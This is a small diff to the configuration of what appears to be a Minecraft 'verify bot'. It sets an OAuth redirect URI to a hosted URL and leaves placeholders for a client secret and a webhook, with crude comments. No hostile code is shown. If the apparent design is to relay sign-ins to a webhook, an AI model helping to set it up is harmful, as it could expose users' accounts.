@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'it is what it is'
-const redirect_uri = 'u know how it is'
+const redirect_uri = 'https://verifybotmc.onrender.com'
 const webhook_url = 'ur shit ass webhook mf'
 
 //Requirements
